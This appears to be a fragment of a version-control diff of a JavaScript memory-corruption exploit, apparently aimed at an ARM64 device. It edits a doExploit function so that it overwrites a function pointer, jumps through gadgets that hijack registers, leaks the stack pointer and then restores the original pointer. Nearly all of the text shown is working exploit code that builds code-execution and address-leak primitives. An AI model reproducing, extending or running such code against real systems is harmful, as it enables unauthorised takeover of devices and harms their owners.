@@ -240,10 +240,9 @@ function doExploit(buf, stale, temp) {
 		}
 	}
 
-	function setjmp() {
-		var mainaddr = walkList();
-		log('Main module at ' + paddr(mainaddr));
+	var mainaddr = walkList();
 
+	function getSP() {
 		/*
 			First gadget: hijack X8 via ADRP and known PC, load X2 from known address and branch there
 		
@@ -287,16 +286,21 @@ function doExploit(buf, stale, temp) {
 
 		log('Assigned.  Jumping.');
 		var ret = func.apply(0x101);
-		log('Jumped.  Look at the stack.');
+		log('Jumped back.');
 
-		var saddr = getAddr(ret);
-		log(paddr(saddr));
-		buf[4] = saddr[0];
-		buf[5] = saddr[1];
-		dumptemp(128);
+		var sp = getAddr(ret);
+
+		log('Got stack pointer: ' + paddr(sp));
+
+		write8(curptr, funcaddr, 8);
+
+		log('Restored original function pointer.');
+
+		return sp;
 	}
 
-	setjmp();
+	log('Stack sitting at: ' + paddr(getSP()));
+	log('Stack sitting at: ' + paddr(getSP()));
 }
 
 function doItAll() {
